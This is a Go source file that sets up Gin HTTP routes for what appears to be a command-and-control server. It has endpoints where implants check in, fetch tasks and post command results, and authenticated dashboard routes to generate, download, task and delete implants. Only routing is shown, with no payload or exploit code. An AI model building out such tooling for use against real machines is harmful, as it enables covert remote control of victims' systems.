package routes

import (
	"awesomeProject/controllers"
	"awesomeProject/middleware"
	"github.com/gin-gonic/gin"
)

func SetupRouter() *gin.Engine {
	r := gin.Default() // Create a new router instance for these routes

	// Public routes
	r.POST("/register", controllers.Register)
	r.POST("/login", controllers.Login)
	r.POST("/checkin", controllers.CheckinImplant)                                          // Implant check-in
	r.GET("/implant-client/:unique_token/commands", controllers.ImplantClientFetchCommands) // Implant client gets tasks
	r.POST("/command-result", controllers.HandleCommandResult)                              // Implant client posts command results

	// Protected routes (for Dashboard UI)
	protected := r.Group("/api")
	protected.Use(middleware.AuthMiddleware())
	{
		protected.GET("/implants", controllers.GetUserImplants)          // Get all implants for the current user
		protected.POST("/generate-implant", controllers.GenerateImplant) // Generate an implant for authenticated user

		protected.POST("/send-command", controllers.SendCommand) // Dashboard sends a command to a specific implant
		// protected.POST("/command-result", controllers.HandleCommandResult) // This is public for implant, not needed under /api

		// Dashboard views command history for an implant it owns
		protected.GET("/implants/:implant_id/commands", controllers.DashboardGetCommandsForImplant)
		protected.DELETE("/implants/:implant_id", controllers.DeleteImplant)         // implant_id here is the unique_token
		protected.GET("/implants/:implant_id/download", controllers.DownloadImplant) // implant_id here is the unique_token
	}

	return r
}
